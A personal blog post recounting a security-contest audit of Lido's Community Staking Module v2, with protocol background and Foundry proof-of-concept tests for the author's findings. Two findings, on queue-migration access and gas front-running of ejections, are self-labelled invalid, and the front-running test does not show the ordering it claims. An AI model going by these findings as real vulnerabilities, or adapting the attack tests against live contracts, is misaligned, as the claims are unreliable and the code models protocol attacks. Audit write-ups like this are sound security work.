## Auditing Lido CSM v2: My Introduction to Staking Protocols
**A technical deep dive into my first major staking protocol audit**

This post chronicles my experience auditing Lido Finance's Community Staking Module v2 (CSM). As one of my first comprehensive staking protocol audits, CSM v2 provided an excellent introduction to validator economics and liquid staking mechanics.

<div align="center">
  <!-- Your existing hero image -->
  <img src="https://github.com/rubencrxz/rubencrxz/blob/main/assets/74f1d2ce-9de2-4787-966e-fe6f1d3fa167.png" alt="Image" width="70%" height="60%"/>
  <br><br>
</div>

## Lido Finance

As its Whitepaper states, Lido DAO is a community that builds liquid staking services for Ethereum. It allows users to earn staking rewards without locking assets or maintaining staking infrastructure.
The core mechanism works as follows: Users deposit their ether into Lido smart contracts and receive stETH -- a tokenized version of staked ether -- in return. The DAO-controlled smart contracts then stake tokens with DAO-picked node operators. Users' deposited funds are controlled by the DAO; node operators never have direct access to the users' assets.
Lido provides a much more flexible solution than self-staking since it avoids freezing assets and maintaining validator infrastructure. Additionally, it allows staking users to earn rewards on deposits as small as they want, without the traditional 32 ETH restriction.

The primary goals of Lido include:

-Allowing users to earn staking rewards without fully locking their ether
-Making it possible to earn rewards on deposits of any size, not just 32 ETH increments
-Reducing risks of losing staked deposits due to software failures or malicious third-parties
-Providing the stETH token as a building block for other DeFi protocols
-Offering an alternative to exchange staking, self-staking, and other semi-custodial protocols


## Token Mechanics: stETH vs wstETH
**Understanding Lido's token system was crucial for the audit, especially since CSM accepts multiple collateral types.**

stETH (Rebasing Token)
The stETH token is a tokenized version of staked ether. When users send ether into the Lido liquid staking contract, they receive the corresponding amount of stETH tokens. The stETH token represents users' deposits along with corresponding staking rewards and slashing penalties. The stETH token serves as a liquid alternative for staked ether: it can be transferred, traded, or used in DeFi applications.
Key characteristic: Balance increases with staking rewards through rebasing.
wstETH (Wrapped stETH)
The wstETH token is a non-rebasing wrapper around stETH, designed specifically for DeFi composability and protocols that cannot handle rebasing tokens. Instead of the token balance increasing daily like stETH, wstETH maintains a constant token supply while its underlying value grows through an increasing exchange rate.
Key characteristic: Fixed supply, price increases with rewards.


## Community Staking Module
**Democratizing Ethereum Staking**

The Community Staking Module represents Lido's first permissionless staking module, aimed at attracting community stakers to participate as Node Operators with significantly lower barriers to entry.
The bond requirement is set at 2.4 ETH for the first validator 

Key Features Making Solo Staking More Accessible:
-Reward Smoothing: EL rewards and MEV are smoothed with other Lido modules, so CSM Node Operators can potentially gain more consistent and stable rewards compared to vanilla solo staking volatility.
-Flexible Collateral: No secondary token security collateral is required, with bonds accepted in ETH, stETH, or wstETH, and rewards received via stETH.
-Operational Efficiency: Node Operators benefit from friendly UX and pay less gas fees for on-chain operations compared to other market options.
-Economic Advantage: Node Operators may potentially gain more validator rewards (on a total ETH spent basis) than vanilla solo staking due to reward socialization and reduced operational overhead.

The ultimate goal is permissionless entry to the Lido on Ethereum Node Operator set, enfranchising solo-staker participation and increasing the total number of independent Node Operators in the overall Ethereum network.

## Technical Architecture 
**Diving into the CSM code**

CSM v2's architecture represents a sophisticated modular design across different core contracts, each with distinct responsibilities that became clear during the audit. The separation follows domain-driven design principles, with contracts grouped into logical subsystems for validator lifecycle, economic security, and protocol governance.

-`CSModule` serves as the protocol's central orchestrator, managing the complete validator lifecycle from key registration through exit processing. It maintains operator state, coordinates with Lido's Staking Router for deposit allocation, and implements the priority queue system that determines stake assignment order. The contract's complexity reflects its role as the primary integration point with Lido's broader ecosystem.

-The Economic Security Layer consists of `CSAccounting` for bond management and reward distribution, `CSExitPenalties` for exit delay penalty calculations, and `CSFeeDistributor` for Merkle-tree-based reward distribution. 
This separation ensures that financial operations are isolated from operational logic.

-The Enforcement Subsystem includes `CSEjector`for EIP-7002 forced exits, `CSStrikes` for performance tracking, and `CSFeeOracle` for consensus-based reporting. These contracts work together to implement automated protocol rule enforcement without requiring manual intervention or operator cooperation. During the audit, I found this modular approach particularly valuable because each enforcement mechanism could be analyzed in isolation while understanding its integration points with the broader system.

## EIP Integration: EIP-7002 Execution Layer Exits

The integration of EIP-7002 represents one of CSM v2's most technically sophisticated features, fundamentally changing how validator exits can be initiated. Pre-EIP-7002, only consensus layer operations could exit validators, requiring operator cooperation through signed exit messages. This created potential griefing scenarios where malicious operators could refuse to exit even when penalized.
`CSEjector` contract implements the execution layer exit mechanism, allowing smart contracts to programmatically force validator exits without relying on operator cooperation. When the protocol detects violations, such as MEV stealing, persistent poor performance, or accumulation of three strikes, the ejector can trigger forced exits through the `ITriggerableWithdrawalsGateway` interface. This creates automated enforcement of protocol rules, removing human discretion and potential delays from the punishment process.

## Economic Aspects: Democratization Through Dynamic Bonding

CSM v2's economic model represents a fundamental reimagining of staking participation barriers, moving from the traditional 32 ETH requirement to a dynamic bonding system starting at just 2.4 ETH. This democratization required sophisticated economic mechanisms to maintain protocol security while lowering entry costs.

The bond curve system is implemented through three abstract contracts: `CSBondCore` handles core deposit/withdrawal logic, `CSBondCurve` manages the mathematical curve calculations, and `CSBondLock` implements penalty lockup mechanisms. Rather than fixed collateral amounts, CSM uses dynamic calculations. This creates economies of scale that discourage Sybil attacks (multiple small operators are more expensive than single larger operators) while still allowing genuine solo stakers to participate with minimal capital. 

Multiple entry pathways further democratize access through distinct gate contracts. `PermissionlessGate` allows anyone to join without restrictions, using the default bond curve (2.4 ETH base). `VettedGate` requires Merkle proof verification for whitelist eligibility but offers preferential curves for verified community stakers or institutional operators. The `VettedGateFactory` enables creation of custom gates with specific bond curves, referral programs, and eligibility criteria. This multi-tier system balances accessibility with risk management: unverified operators pay higher bonds, while verified participants benefit from reduced capital requirements and preferential treatment in the stake allocation queue.

## Penalty distribution and reward socialization 

The system differentiates between violation types: simple performance issues trigger strike accumulation and temporary restrictions, while serious offenses like MEV stealing result in immediate bond slashing. Importantly, rewards are smoothed across all Lido modules, meaning CSM operators benefit from MEV averaging and execution layer rewards socialization, providing more predictable returns than volatile solo staking. This economic design successfully democratizes access not just by reducing capital requirements, but by providing the stability and predictability that attract operators who might otherwise be deterred by independent staking's inherent variance.

## My Thoughts on the Audit
**This was my first major audit > 1,000 Sloc**

Until now, I had been working with straightforward two-file projects where you could hold the entire logic in your head. CSM v2 was different. This was architecture, not just code.

The learning curve was steep but incredibly rewarding. Understanding how CSModule orchestrates with CSAccounting, how the abstract bond contracts work together, how entry gates coordinate with the main protocol required discipline I had not developed yet. I had to slow down, map out relationships, trace fund flows across multiple contracts. However, it helped me to start to develope and work on an organic and organized way of auditing, which includes having a structured planification and a methodical approach.

Diving into the code was such a cool experience. The code quality was genuinely impressive. Clean, well-documented, thoughtfully structured. The fact that zero high or medium vulnerabilities were found in the entire competition speaks volumes about Lido's engineering practices.

I made mistakes. One of my submissions was flagged for showing signs of AI assistance in the analysis. That was a wake-up call I needed. It forced me to confront a uncomfortable truth: I was leaning too heavily on LLMs for report writing instead of doing the deep technical work myself.
That stung, but it was exactly the feedback I needed to level up. Now I am much more careful about ensuring every vulnerability I report comes from my own understanding, not from pattern-matching or AI suggestions I have not fully validated.

CSM v2 helped to teach me that auditing complex protocols is not just about finding already reported bugs. It is about deeply understanding big and complex systems and creatively thinking how they can be attacked.

## My submissions
**Non valids**

The following minimal changes were made to the base `PoC.t.sol` file to enable local testing:
```diff
+   // Added import for interface dependency
+   import { NodeOperatorManagementProperties } from "../src/interfaces/ICSModule.sol";
.
.
.
    function setUp() public {
        Env memory env = envVars();
        vm.createSelectFork(env.RPC_URL);
        initializeFromDeployment();      
+       // deployParams = parseDeployParams(env.DEPLOY_CONFIG); Commented out due to local environment parsing issues
        adminsCount = block.chainid == 1 ? 1 : 2;
    }
.
.
.
-   function test_PoC() public view {
+   function test_PoC() public {
```


### [M-01] `CSModule::migrateToPriorityQueue()` Missing Access Control Allows Unauthorized Economic Manipulation

## Description
The `migrateToPriorityQueue()` function in CSModule.sol completely lacks access control, allowing any external user to force node operator migration to priority queues without owner consent. This vulnerability breaks the protocol's permission model and enables targeted griefing attacks against specific operators.
The function is marked as external with no access modifiers:
```solidity
function migrateToPriorityQueue(uint256 nodeOperatorId) external {
    // No access control 
    NodeOperator storage no = _nodeOperators[nodeOperatorId];
    // ... 
}
```

## Impact
Unauthorized economic manipulation: Attackers can alter victim operators staking strategies, forcing them to use `migrateToPriorityQueue()` when it's not optimal for them. This results in:

Control loss: Operators lose control over when to use their unique priority queue migration
Targeted griefing: Attackers can specifically sabotage competitors or target operators
Competitive disadvantage: Operators forced to use priority at suboptimal moments lose queue positioning advantages

## Proof of Code
```solidity
function test_RandomUserCanForceMigrateToPriorityQueue() public {
    // Create a node operator with a legitimate owner using permissionless gate
    address nodeOperatorOwner = makeAddr("nodeOperatorOwner");
    console.log("Node Operator Owner:", nodeOperatorOwner);

    // Give owner enough ETH for bond
    vm.deal(nodeOperatorOwner, 100 ether);

    // Create keys 
    bytes memory pubkey = bytes.concat(new bytes(16), abi.encodePacked(keccak256("migrationkey")));
    bytes memory signature = bytes.concat(new bytes(64), abi.encodePacked(keccak256("migrationsig")));

    vm.startPrank(nodeOperatorOwner);
    uint256 nodeOperatorId = permissionlessGate.addNodeOperatorETH{value: 50 ether}(
        1, // keysCount
        pubkey,
        signature,
        NodeOperatorManagementProperties({
            managerAddress: nodeOperatorOwner,
            rewardAddress: nodeOperatorOwner,
            extendedManagerPermissions: false
        }),
        address(0) // no referrer
    );
    vm.stopPrank();

    console.log("Created Node Operator ID:", nodeOperatorId);

    // Add more keys to have something significant to migrate
    bytes memory additionalPubkey = bytes.concat(new bytes(16), abi.encodePacked(keccak256("migrationkey2")));
    bytes memory additionalSignature = bytes.concat(new bytes(64), abi.encodePacked(keccak256("migrationsig2")));

    vm.startPrank(nodeOperatorOwner);
    uint256 required = accounting.getRequiredBondForNextKeys(nodeOperatorId, 1);
    vm.deal(nodeOperatorOwner, required);
    
    csm.addValidatorKeysETH{value: required}(
        nodeOperatorOwner,
        nodeOperatorId,
        1,
        additionalPubkey,
        additionalSignature
    );
    vm.stopPrank();

    // Setup a priority queue configuration 
    uint32 PRIORITY_QUEUE = 0;
    uint32 MAX_DEPOSITS = 10;
    
    // Find someone with admin rights to the parameters registry
    address adminAddress;
    try parametersRegistry.getRoleMember(parametersRegistry.DEFAULT_ADMIN_ROLE(), 0) returns (address admin) {
        adminAddress = admin;
        console.log("Found admin address:", adminAddress);
    } catch {
        adminAddress = makeAddr("assumedAdmin");
        console.log("Using assumed admin address:", adminAddress);
    }
    
    vm.startPrank(adminAddress);
    parametersRegistry.setQueueConfig(0, PRIORITY_QUEUE, MAX_DEPOSITS);
        console.log("Priority queue configured successfully");
    vm.stopPrank();

    // Random user can force migration
    address randomAttacker = makeAddr("randomAttacker");
    
    vm.startPrank(randomAttacker);
    
    // Try to migrate on behalf of the node operator WITHOUT permission
    csm.migrateToPriorityQueue(nodeOperatorId);
    console.log("SUCCESS: Random user forced migration!");
    vm.stopPrank();
}
```

## Recommended Mitigation
Implement access control that allows only the operator owner to perform the migration.


### [H-01] Node Operators Can Evade Penalties Through Gas Based Front-Running of `CSEjector::ejectBadPerformer`

## Description
The Ejector contract is susceptible to front-running, enabling node operators to bypass penalties. When the strikes role triggers `ejectBadPerformer` to penalize a validator for poor performance, an operator can submit a `voluntaryEject` transaction with a higher gas price (50 gwei vs. 20 gwei). In a real network, miners prioritize the higher gas price transaction, executing `voluntaryEject` before `ejectBadPerformer`. This resets the validator state, avoiding the penalty. The vulnerability stems from the lack of a locking mechanism during penalty evaluation, allowing operators to monitor the mempool and front-run the penalty transaction.

## Impact
Penalty Avoidance: Operators can systematically avoid penalties, leading to unpunished underperformance, potential slashing losses, and eroded trust in the protocol.
Likelihood: High in congested networks where mempool front-running is feasible.
Economic Risk: Significant, as penalty evasion could result in lost funds due to the penalty evasion.


## Proof Of Code
```solidity
function test_PenaltyEvasionViaGasFrontRunning_Simplified() public {
        console.log("=== Front-Running Attack Test (Simplified) ===");
        
        address operatorAddress = makeAddr("operator");
        address refundEOA = makeAddr("refund_eoa"); // EOA to receive refunds
        vm.deal(operatorAddress, 100 ether);
        vm.deal(refundEOA, 1 ether);
        vm.deal(address(strikes), 10 ether);
        
        bytes memory pubkey = bytes.concat(new bytes(16), abi.encodePacked(keccak256("operatorkey")));
        bytes memory signature = bytes.concat(new bytes(64), abi.encodePacked(keccak256("operatorsig")));
        
        // Add node operator
        vm.startPrank(operatorAddress);
        uint256 nodeOperatorId = permissionlessGate.addNodeOperatorETH{value: 50 ether}(
            1, // keysCount
            pubkey,
            signature,
            NodeOperatorManagementProperties({
                managerAddress: operatorAddress,
                rewardAddress: operatorAddress,
                extendedManagerPermissions: false
            }),
            address(0) // no referrer
        );
        vm.stopPrank();
        
        console.log("Node Operator ID:", nodeOperatorId);
        uint256 keyIndex = 0;
        
        // Simulate deposited keys via staking router
        address stakingRouter = csm.getRoleMember(csm.STAKING_ROUTER_ROLE(), 0);
        vm.startPrank(stakingRouter);
        csm.obtainDepositData(1, ""); 
            console.log("Keys marked as deposited via obtainDepositData");
        vm.stopPrank();
        
        uint256 depositedKeys = csm.getNodeOperatorTotalDepositedKeys(nodeOperatorId);
        console.log("Deposited keys:", depositedKeys);
        
        // STEP 1: Bad performance penalty 
        vm.txGasPrice(20 gwei); // Gas paid to execute the first transaction
        vm.startPrank(address(strikes));
        
        console.log("=== Executing ejectBadPerformer (20 gwei) ===");
        bool isWithdrawnBefore = csm.isValidatorWithdrawn(nodeOperatorId, keyIndex);
        console.log("Withdrawn before penalty:", isWithdrawnBefore);
        
        ejector.ejectBadPerformer{value: 1 ether}(
            nodeOperatorId,
            keyIndex,
            refundEOA // Use EOA to avoid fallback issues
        ); 
        vm.stopPrank();
        
        // PASO 2: Front-run with voluntary exit 
        vm.txGasPrice(50 gwei); // Gas paid to execute the second transaction
        vm.startPrank(operatorAddress);
        
        console.log("=== Executing voluntaryEject Front-Run (50 gwei) ===");
        
        ejector.voluntaryEject{value: 1 ether}(
            nodeOperatorId, 
            keyIndex, 
            1, 
            refundEOA 
        );
        vm.stopPrank();
    } 
```


## Recommended Mitigations
Temporary Node Lock on Penalty Evidence:

When evidence for a penalty is submitted, implement a temporary lock on the node operator's ability to call `voluntaryEject`. This can be achieved by:
Adding a state variable (`isPenaltyPending`) in the Ejector or CSM contract, set to true when penalty conditions are met, reverting `voluntaryEject` if `isPenaltyPending` is true for the node operator and clearing the lock after the penalty is resolved.


## Valid Low´s from the Contest

### [L-01] Batch Operation Fully Reverts on Invalid Ejection Entry
Type: Logic Error / Design Flaw

## Summary
The processBadPerformanceProof function in the CSStrikes contract, which handles batch ejections for validators with excessive strikes, will revert the entire transaction if any single validator in the batch does not meet the required strike threshold for ejection. This “all-or-nothing” behavior is caused by a hard revert within the internal _ejectByStrikes function when it encounters an invalid entry.

Consequently, all other valid ejections within the same batch are also rolled back, preventing their timely processing. This design introduces operational inefficiency, as the entire batch must be filtered off-chain and resubmitted, potentially delaying necessary enforcement actions against poorly performing validators.

## Description
In Lido’s Community Staking Module, when processing batch validator ejections for excessive strikes, the entire batch operation will revert if any single entry in the batch fails a required precondition. This means no state changes or side effects are committed, even for entries that satisfy all requirements.

Concretely, in CSStrikes.processBadPerformanceProof, a list of validator keys is processed for potential ejection. For each entry, the function calls the internal _ejectByStrikes method, which calculates the total strikes and checks them against the configured threshold. If any entry in the batch has strikes < threshold, _ejectByStrikes reverts with NotEnoughStrikesToEject(). Due to EVM atomicity, this causes the entire transaction to revert, undoing all previous state changes and external calls, including for those entries that otherwise qualified for ejection.

in CSStrikes#L243-L245:

```solidity
if (strikes < threshold) {

    revert NotEnoughStrikesToEject();

}
```

While enforcing the threshold check on-chain is reasonable to ensure protocol-level consistency and security, reverting the entire transaction due to a single invalid entry is unnecessarily restrictive. This design can prevent the timely processing of valid entries within the batch and introduce operational friction.

## PoC
This PoC was implemented directly in the existing CSStrikesProofTest suite, not PoC.t.sol, due to the low severity and straightforward nature of the issue.

The scenario is:

A user (or automation) submits a batch proof for ejection:

[Key1 (sufficient strikes), Key2 (sufficient strikes), Key3 (insufficient strikes)]
processBadPerformanceProof begins processing.
On reaching Key3, the function reverts, causing the entire transaction to revert.
No validator is ejected, no penalties are recorded, and the operation must be retried offchain with a filtered list.

```solidity
function test_processBadPerformanceProof_RevertWhen_OneOfManyHasNotEnoughStrikes()

public

{

// 1. Setup test environment and manual Merkle tree.

// Set the strikes threshold for ejection to 50.

uint256 STRIKES_THRESHOLD = 50;

module.PARAMETERS_REGISTRY().setStrikesParams(0, 6, STRIKES_THRESHOLD);


// Manually create leaves for success/failure scenarios.

// Successful entry 1 (strikes > 50)

(bytes memory pubkey0, ) = keysSignatures(1, 0);

uint256[] memory strikesData0 = UintArr(60); // total strikes: 60

leaves.push(Leaf(ICSStrikes.KeyStrikes({ nodeOperatorId: 0, keyIndex: 0, data: strikesData0 }), pubkey0));


// Successful entry 2 (strikes > 50)

(bytes memory pubkey1, ) = keysSignatures(1, 1);

uint256[] memory strikesData1 = UintArr(70); // total strikes: 70

leaves.push(Leaf(ICSStrikes.KeyStrikes({ nodeOperatorId: 1, keyIndex: 0, data: strikesData1 }), pubkey1));


// Failing entry (strikes < 50)

(bytes memory pubkey2, ) = keysSignatures(1, 2);

uint256[] memory strikesData2 = UintArr(40); // total strikes: 40

leaves.push(Leaf(ICSStrikes.KeyStrikes({ nodeOperatorId: 2, keyIndex: 0, data: strikesData2 }), pubkey2));


// Build the Merkle tree with the constructed leaves.

tree.pushLeaf(abi.encode(0, pubkey0, strikesData0));

tree.pushLeaf(abi.encode(1, pubkey1, strikesData1));

tree.pushLeaf(abi.encode(2, pubkey2, strikesData2));


// Submit the Merkle root to the contract.

bytes32 root = tree.root();

vm.prank(oracle);

strikes.processOracleReport(root, someCIDv0());


// 2. Prepare proof data and mocking.

uint256[] memory indicies = UintArr(0, 1, 2);

ICSStrikes.KeyStrikes[] memory keyStrikesList = new ICSStrikes.KeyStrikes[](indicies.length);

for(uint256 i = 0; i < indicies.length; ++i) {

    keyStrikesList[i] = leaves[i].keyStrikes;

}


(bytes32[] memory proof, bool[] memory proofFlags) = tree.getMultiProof(indicies);


// Mock getSigningKeys calls for all entries in the loop.

for (uint256 i = 0; i < indicies.length; i++) {

    Leaf memory leaf = leaves[indicies[i]];

    vm.mockCall(

        address(module),

        abi.encodeWithSelector(

            ICSModule.getSigningKeys.selector,

            leaf.keyStrikes.nodeOperatorId,

            leaf.keyStrikes.keyIndex,

            1

        ),

        abi.encode(leaf.pubkey)

    );

}


// 3. Expect revert and call the function.

// The proof is valid, so the revert will occur inside _ejectByStrikes due to threshold failure.

vm.expectRevert(ICSStrikes.NotEnoughStrikesToEject.selector);


this.processBadPerformanceProof{ value: keyStrikesList.length }(

    keyStrikesList,

    proof,

    proofFlags,

    address(0)

);


// Because the revert happens, even the entries that should have succeeded do not have their state updated.

}
```

The following log shows that EjectorMock::ejectBadPerformer is successfully called for the first two entries in the batch (with sufficient strikes), but the transaction ultimately reverts on the third entry (NotEnoughStrikesToEject()), rolling back all prior state changes as expected.

Ran 1 test for test/CSStrikes.t.sol:CSStrikesProofTest

[PASS] test_processBadPerformanceProof_RevertWhen_OneOfManyHasNotEnoughStrikes() (gas: 880667)

...

│   │   ├─ [285] EjectorMock::ejectBadPerformer{value: 1}(0, 0, CSStrikesProofTest: [...])

│   │   │   └─ ← [Stop] 

│   │   ├─ [583] ExitPenaltiesMock::processStrikesReport(0, ...)

│   │   │   └─ ← [Stop] 

│   │   ├─ [285] EjectorMock::ejectBadPerformer{value: 1}(1, 0, CSStrikesProofTest: [...])

│   │   │   └─ ← [Stop] 

│   │   ├─ [583] ExitPenaltiesMock::processStrikesReport(1, ...)

│   │   │   └─ ← [Stop] 

│   │   └─ ← [Revert] NotEnoughStrikesToEject()

│   └─ ← [Revert] NotEnoughStrikesToEject()

└─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 12.50ms (1.93ms CPU time)

## Impact
This can lead to unnecessary delays in enforcement, particularly when large batches are submitted, as the entire batch must be retried after removing the invalid entry.
When reporting large batches of poor-performing validators, a single invalid entry can cause unnecessary transaction failures and delay enforcement across the protocol.

## Recommendations
To improve operational efficiency, the contract should be updated to process all valid entries within a batch and simply skip any invalid ones, emitting an event for each skipped entry. This ensures that valid reports are handled without delay, and skipped entries can still be tracked off-chain.

```solidity
if (strikes >= threshold) {

    ejector.ejectBadPerformer{ value: value }(

        keyStrikes.nodeOperatorId,

        keyStrikes.keyIndex,

        refundRecipient

    );

    EXIT_PENALTIES.processStrikesReport(keyStrikes.nodeOperatorId, pubkey);

} else {

	// emit event

}
```


### [L-02] Mid-Season Merkle Root Update Invalidates Previously Valid Proofs
Type: Operational / Design Limitation

## Summary
In the VettedGate referral reward system, the on-chain contract stores a single active merkleRoot and verifies claims with respect to that root. If the root is updated mid-season — even without removing a legitimate referrer from the set — all proofs generated against the previous root become invalid and cannot be used to claim rewards.

This behavior is inherent to Merkle proof verification: proofs are root-specific, so any root change (due to leaf removal, addition, or re-ordering) requires distributing new proofs to all eligible participants.

While this is not a security bug, it introduces an operational dependency: off-chain systems must re-issue updated proofs to all still-eligible referrers whenever the root changes.

## Description
During a referral season, administrators may call:

in VettedGate.sol#L291-297:

vettedGate.setTreeParams(newRoot, newCid);
to replace the current Merkle root and CID. This may happen to ban malicious addresses or add new reward addresses. However:

The contract does not store historical roots. and claimReferrerBondCurve always calls verifyProof against the current root.
Because Merkle proofs are tied to a specific root, any proof generated for a previous root will become invalid after an update, even if the address remains in the new tree.
Example sequence:

Season starts, tree = [NodeOperator, Stranger, AnotherNodeOperator].
Stranger reaches referral threshold.
Admin updates root mid-season to [Stranger, NodeOperator] to ban AnotherNodeOperator.
Stranger tries to claim with old proof (built for index=1 in old tree) → InvalidProof revert.
Stranger must obtain new proof (index=0 in new tree) to succeed.
This matches expected Merkle mechanics but can surprise operators if not accounted for.

## PoC
This PoC was implemented directly in the existing VettedGateReferralProgramTest suite, not PoC.t.sol, due to the low severity and straightforward nature of the issue.

```solidity
function test_proofBreaksAfterRootUpdate_whenIndexShifts() public {

    _addReferrals();

    bytes32[] memory oldProof = merkleTree.getProof(1); // stranger's original index is 1


    MerkleTree newTree = new MerkleTree();

    newTree.pushLeaf(abi.encode(stranger)); // index now 0

    newTree.pushLeaf(abi.encode(anotherNodeOperator));

    bytes32 newRoot = newTree.root();


    vm.startPrank(admin);

    vettedGate.grantRole(vettedGate.SET_TREE_ROLE(), admin);

    vettedGate.setTreeParams(newRoot, "cid");

    vm.stopPrank();


    NodeOperatorManagementProperties memory no;

    no.rewardAddress = stranger;

    CSMMock(csm).mock_setNodeOperatorManagementProperties(no);


    // Old proof fails

    vm.expectRevert(IVettedGate.InvalidProof.selector);

    vm.prank(stranger);

    vettedGate.claimReferrerBondCurve(0, oldProof);


    // New proof works

    bytes32[] memory newProof = newTree.getProof(0);

    vm.prank(stranger);

    vettedGate.claimReferrerBondCurve(0, newProof);

}
```
Test Output:

Ran 1 test for test/VettedGate.t.sol:VettedGateReferralProgramTest

[PASS] test_proofBreaksAfterRootUpdate_whenIndexShifts() (gas: 1228763)

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 69.27ms (4.04ms CPU time)

## Impact
Operational: Every root change forces all still-eligible participants to obtain a new proof before claiming.
Timing risk: If root updates occur between reaching threshold and claiming, legitimate claims can fail until new proofs are distributed.
User experience: Users unaware of the root update may face unexpected InvalidProof errors.

## Recommendations
Document this behavior in the admin/operator playbook so off-chain systems automatically re-generate and distribute proofs upon root update. or
Consider keyed Merkle tree or index-stable design (e.g., sparse Merkle tree with address-based leaves) to minimize proof regeneration cost, though root changes will still invalidate old proofs. or
Optionally store previous root(s) temporarily and accept them for a grace period to reduce operational friction. or
A stricter on-chain safeguard could block setTreeParams when isReferralProgramSeasonActive == true, preventing mid-season root updates entirely — but this would significantly restrict operational flexibility (e.g., urgent malicious address removal) and may not be desirable in practice.
